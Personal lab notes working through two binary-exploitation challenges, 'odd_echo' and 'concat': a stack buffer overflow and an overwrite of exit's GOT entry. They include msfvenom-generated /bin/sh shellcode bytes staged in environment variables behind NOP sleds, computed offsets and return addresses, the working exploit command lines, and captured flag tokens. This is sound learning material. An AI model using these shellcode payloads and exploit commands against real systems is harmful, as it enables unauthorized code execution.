![[Pasted image 20260629145317.png]]
![[Pasted image 20260629145359.png]]
![[Pasted image 20260629145410.png]]
![[Pasted image 20260629145502.png]]


# Understand odd_echo

![[Pasted image 20260629151232.png]]
![[Pasted image 20260629151349.png]]

# Understand odd_echo code. 
![[Pasted image 20260629145924.png]]
![[Pasted image 20260629145941.png]]

it takes the argv which is sent to the main function if less than two it gives an error then the main function does echo call where the char arg is passed to char *s there is a defined buf[10]= which is 8 bytes long. then strcat function is being called where buf and s is passed.  


function my_strcat does this. 

int len = strlen(dst);   // len = 8 ("--ECHO: " is 8 chars)
dst += len;              // moves pointer to buf[8] (end of "--ECHO: ")

while (*src) {           // copy until null byte
    if (*src == 0x31)    // 0x31 = ASCII '1' ← THIS IS THE ODD STOP CHARACTER
        break;
    *dst = *src;         // copy byte
    ++dst; ++src;        // advance both pointers
}

## Important point to not here it ends at 1 and not 0. So if i pass 1 it will end and not 0. 


buf[10] = "--ECHO: \0"
           01234567 8  9
                    ↑
           my_strcat starts writing HERE
           only 2 bytes before overflow!
           
if i pass more than 8 charachters. I get segmentation fault. 

![[Pasted image 20260701143835.png]]

# Calculating offset at echo 

We are choosing echo because one this is where the size is declared and it gets passed to strcat for declaration.

disas echo      → tells you WHERE the buffer is (the offset from %ebp)
my_strcat       → is WHERE the writing happens (but no buffer declared there)

![[Pasted image 20260701150255.png]]

So the buffer starts at ebp - decimal(18) 0x12 

To structure my payload I need 18 + 4 bytes (saved ebp)

# Controlling return address

r $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*18 + b"AAAA" )')

I see this 
![[Pasted image 20260701152133.png]]

![[Pasted image 20260701152344.png]]
crash should show 0x44434241, that means it has overran the past address. 
![[Pasted image 20260701153309.png]]

![[Pasted image 20260701153450.png]]

Now I only see 55 and not 41 I should be able to see the 41 for that I will try reducing the number of buffer. when i do 17 i can see a A

![[Pasted image 20260701153721.png]]

I will keep reducing it till i see 44434241 it is 14. 

![[Pasted image 20260701153943.png]]

So the final payload structure is \x55 * 14

# Prepare Shellcode


https://medium.com/@kisalnelaka6/demystifying-shellcode-generation-a-guide-for-beginners-e8b536599296

[hacker22@warhead chal6]$ msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x31' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No badchars present in payload, skipping automatic encoding
No encoder specified, outputting raw payload
Payload size: 43 bytes
Final size of python file: 227 bytes
buf =  b""
buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
buf += b"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += b"\x00\x57\x53\x89\xe1\xcd\x80"
[hacker22@warhead chal6]$

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80


## Testing the shellcode 


![[Pasted image 20260701162126.png]]

![[Pasted image 20260701162158.png]]

the problem is the shellcode is 43 bytes long so we need to put the shellcode in environment variable 

# How to put shellcode in environment variable 


https://medium.com/@danielorihuelarodriguez/store-shellcode-in-environment-variable-1058062b8b5e
Now the problem is that because of the null bytes you can see truncated 
![[Pasted image 20260701174835.png]]

So I am going to ask payload to avoid both the bytes. 

The new shellcode is this 

\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xa4\x8c\x15\x84\x83\xee\xfc\xe2\xf4\xce\x87\x4d\x1d\xf6\xea\x7d\xa9\xc7\x05\xf2\xec\x8b\xff\x7d\x84\xcc\xa3\x77\xed\xca\x05\xf6\xd6\x4c\x84\x15\x84\xa4\xa3\x77\xed\xca\xa3\x66\xec\xa4\xdb\x46\x0d\x45\x41\x95\x84


I am not using echo here instead I am using python 


export SC=$(python3 -c '
import sys
buf  = b"\x90" * 100   # NOP sled makes address guessing easier
buf += b"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xa4\x8c\x15\x84\x83\xee\xfc\xe2\xf4"
buf += b"\xce\x87\x4d\x1d\xf6\xea\x7d\xa9\xc7\x05\xf2\xec"
buf += b"\x8b\xff\x7d\x84\xcc\xa3\x77\xed\xca\x05\xf6\xd6"
buf += b"\x4c\x84\x15\x84\xa4\xa3\x77\xed\xca\xa3\x66\xec"
buf += b"\xa4\xdb\x46\x0d\x45\x41\x95\x84"
sys.stdout.buffer.write(buf)
')



https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow

![[Pasted image 20260701185358.png]]
![[Pasted image 20260701190231.png]]
![[Pasted image 20260701190639.png]]



if you export env in different terminal you will not see in gdb 

SC is at `0xffffde4f` but that includes the `SC=` prefix (3 bytes)
0xffffde4f:     

![[Pasted image 20260701190919.png]]

![[Pasted image 20260701191138.png]]

# Now trying this on oddecho_noaslr

this has to be outside gdb 

add environment variable again 

export SC=$(python3 -c '
import sys
buf  = b"\x90" * 100   # NOP sled makes address guessing easier
buf += b"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xa4\x8c\x15\x84\x83\xee\xfc\xe2\xf4"
buf += b"\xce\x87\x4d\x1d\xf6\xea\x7d\xa9\xc7\x05\xf2\xec"
buf += b"\x8b\xff\x7d\x84\xcc\xa3\x77\xed\xca\x05\xf6\xd6"
buf += b"\x4c\x84\x15\x84\xa4\xa3\x77\xed\xca\xa3\x66\xec"
buf += b"\xa4\xdb\x46\x0d\x45\x41\x95\x84"
sys.stdout.buffer.write(buf)
')

I can see it in sc 
![[Pasted image 20260701232145.png]]

I got a segmentation fault 
![[Pasted image 20260701232312.png]]

will need to change the address

![[Pasted image 20260701232558.png]]

since it was crashing i went lower 

![[Pasted image 20260701232658.png]]


ret_addr = b"\x42\xde\xff\xff"

sh-5.3$ win
Congratulations! Submit this token: 22-z2dFw2LY8DGDDmo9ljntEg-22
22-z2dFw2LY8DGDDmo9ljntEg-22



# Understanding Concat functioning 



![[Pasted image 20260702100535.png]]
![[Pasted image 20260702100743.png]]

# Understanding concat code. 

![[Pasted image 20260702100956.png]]

main function takes two argument int argc and char argv first it check if you have three arguments then it prints enter two strings but what i have noticed is that if i dont give any arguments how does that work should it be less than argc <= 3 the main function has defined the buffer as 128 bytes and has a pointer *p then this p contatenates buffer 128 and len of the argument then strcpy copies the argument in buffer this is our vulnerable function strcpy i think we should find the address of this for calculating our buffer. then strcpy copies the second argument argv[2], which we found earlier. 

i think i missed exit(0)
https://security.stackexchange.com/questions/52754/can-this-code-be-expoited-using-buffer-overflow

 **It does not overwrite the EIP because exit() will terminate the program before the return address is popped.

Why standard overflow won't work:
normal overflow → overwrite return address → ret fires → shell
                                              ↑
                                         NEVER HAPPENS
                                         because exit(0) runs
                                         before function returns!
 **
https://security.stackexchange.com/questions/136647/why-must-a-ret2libc-attack-follow-the-order-system-exit-command


[[temp_re/Reverse Engineering/GOT overwrite|GOT overwrite]] 
[[05_Reverse_Engineering/03_Exploitation_Security/Security Mechanisms|Security Mechanisms]]

https://vickieli.dev/binary%20exploitation/attacking-dynamic-linking/
https://youtu.be/kUk5pw4w0h4?si=Mga3l0xED4P-XFTJ


`printf`, `malloc`, and `puts` are part of the standard C library (`libc`).
they reside in a centralized shared library file such as `/lib/x86_64-linux-gnu/libc.so.6`. When a program calls one of these functions, it actually references the implementation in this shared library, which is loaded into memory when the program runs.


# Understanding got 

https://can-ozkan.medium.com/got-vs-plt-in-binary-analysis-888770f9cc5a

![[Pasted image 20260702152055.png]] 

Here 
`00004014` is the address in the GOT where the address of printf will be stored after it is resolved.

# Understanding PLT

## 4. What is the PLT?

When a program calls an external function such as `printf`, it doesn’t jump directly to the function’s memory address. Instead, it jumps to a corresponding entry in the PLT, which then handles resolving or dispatching the call.

# Understanding the connection between PLT and GOT 


When main executes `call 1080 <fprintf@plt>`, control goes to the PLT stub, which reads a jump target out of the GOT slot at 00004014. On the _first_ call, that slot doesn't have the real address yet it triggers the **resolver instead. Once resolved,** that same slot at 00004014 gets **overwritten** to store fprintf's actual address in libc, so every call after that jumps straight there.

![[Pasted image 20260702154039.png]]


![[Pasted image 20260702154015.png]]

Per the  usually the exact same function
1. **Format String Vulnerability** or an **Arbitrary Write** primitive. it does take the input function. 

2. The Target: In our code case it will be this fprintf(stdout, %s) because per this the overwrite has already happen. 

3. the overwrite:  fprintf function as our target which will be overwritten 

4. trigger: here in the example it says printf user input 

![[Pasted image 20260702124629.png]]

https://infosecwriteups.com/got-overwrite-bb9ff5414628

# Trial 1 

![[Pasted image 20260705165459.png]]

![[Pasted image 20260705170132.png]]

![[Pasted image 20260705170149.png]]


![[Pasted image 20260705170302.png]]

set *0x56556020=0xf7dc98b0

![[Pasted image 20260705172521.png]]

![[Pasted image 20260705173659.png]]

### So the full permission breakdown is

```
r = readable
w = writable  
x = executable
- = permission not granted
p = private (copy-on-write)
s = shared
```
**Private (`p`):**  
The mapping is **copy-on-write**. If this process tries to modify these pages, the kernel gives it its own private copy — changes are invisible to other processes and don't affect the original file on disk.

**Shared (`s`):**  
Changes to this mapping are visible to other processes and written back to the underlying file.


RELRO blocking the GOT overwrite attempt.

# Trial 2 

# We are overwriting exit instead of printf 


Timing of when each function gets called:

strcpy(buffer, argv[1]);     ← copy happens here
strcpy(p, argv[2]);          ← overwrite happens HERE
                             
fprintf(stdout, "%s\n", buffer);  ← called AFTER overwrite
exit(0);                          ← called AFTER fprintf

**fprintf argument problem:**

c

```c
fprintf(stdout, "%s\n", buffer);
```

fprintf takes **3 arguments** — stdout, a format string, and buffer. If you redirect `fprintf` to `system`, it becomes:

c

```c
system(stdout, "%s\n", buffer);
```

`system` only looks at its **first argument**, which would be `stdout` — a file descriptor pointer, not `/bin/sh`. So you'd be calling `system(stdout_pointer)` which is garbage.

```
argv[1] = "/bin/sh"              ← lands at buffer[0]
argv[2] = [padding to reach GOT] + [address of system] + [anything] + [address of buffer]
```

So when `system` gets called instead of `exit`, the address of `buffer` (which contains `/bin/sh`) is already in the right place on the stack as the argument.

![[Pasted image 20260705181405.png]]

![[Pasted image 20260705181457.png]]

![[Pasted image 20260705181519.png]]

we need to check the **actual runtime address** of the GOT entry, not the offset from objdump

figure out the distance from `p` to the GOT entry:

bash

```bash
(gdb) p address of system - (address of buffer + 7)
```

That distance tells you how much padding to put in `argv[2]` before the system address.
this will not work cause system will be in text region
# Trial 3 

buffer address 
![[Pasted image 20260705235704.png]]

p 
![[Pasted image 20260705235909.png]]

# Attack Method : 

argument 1 (128  bytes x A's padding + exit address ) argument 2(environment variable )

environment variable = shellcode - NOPS and null character. 

##  Trying to find exit address 

![[Pasted image 20260706001415.png]]

per disas 

![[Pasted image 20260706001514.png]]
![[Pasted image 20260706002128.png]]

How to find the ebx value 

![[Pasted image 20260706002639.png]]

`0x56558ff4` + `0x18` = **`0x5655900c`**

\x0c\x90\x55\x56
# Crafting the shellcode 

because we are doing string copy the null bytes should not be there. 

msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python

![[Pasted image 20260706003153.png]]

## Testing the shellcode 

![[Pasted image 20260706003618.png]]

# Putting the shellcode in environment variable 

export SC=$(python3 -c '
import sys
buf  = b"\x90" * 100   
buf += b"\xdd\xc2\xbf\xb3\x2b\x82\x09\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0b\x31\x78\x1a\x83\xc0\x04\x03\x78"
buf += b"\x16\xe2\x46\x41\x89\x51\x31\xc4\xeb\x09\x6c\x8a"
buf += b"\x7a\x2e\x06\x63\x0e\xd9\xd6\x13\xdf\x7b\xbf\x8d"
buf += b"\x96\x9f\x6d\xba\xa1\x5f\x91\x3a\x9d\x3d\xf8\x54"
buf += b"\xce\xb2\x92\xa8\x47\x66\xeb\x48\xaa\x08"
sys.stdout.buffer.write(buf)
')

## Making sure it is in the same terminal 


export SC=$(python3 -c '
import sys
buf  = b"\x90" * 100   
buf += b"\xdd\xc2\xbf\xb3\x2b\x82\x09\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0b\x31\x78\x1a\x83\xc0\x04\x03\x78"
buf += b"\x16\xe2\x46\x41\x89\x51\x31\xc4\xeb\x09\x6c\x8a"
buf += b"\x7a\x2e\x06\x63\x0e\xd9\xd6\x13\xdf\x7b\xbf\x8d"
buf += b"\x96\x9f\x6d\xba\xa1\x5f\x91\x3a\x9d\x3d\xf8\x54"
buf += b"\xce\xb2\x92\xa8\x47\x66\xeb\x48\xaa\x08"
sys.stdout.buffer.write(buf)
')

![[Pasted image 20260706003932.png]]

# Find the address of the enviornment variable 

https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow

![[Pasted image 20260706010137.png]]

Thinking of picking up the middle of NOP sled 

![[Pasted image 20260706010732.png]]

The exploit 

(gdb) r `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x0c\x90\x55\x56")'` `python3 -c 'import sys; sys.stdout.buffer.write(b"\x1c\xde\xff\xff")'`


![[Pasted image 20260706010840.png]]

it worked now trying no_aslr 

![[Pasted image 20260706011240.png]]

![[Pasted image 20260706011322.png]]

trying to adjust 

silly mistake!

[hacker22@warhead bin]$ ./concat_noaslr `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x0c\x90\x55\x56")'` `python3 -
c 'import sys; sys.stdout.buffer.write(b"\x1c\xde\xff\xff")'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                                                                                                                                �UV
sh-5.3$


![[Pasted image 20260706011558.png]]

22-whWNwzvsTn95Q8qa8ZQNqQ-22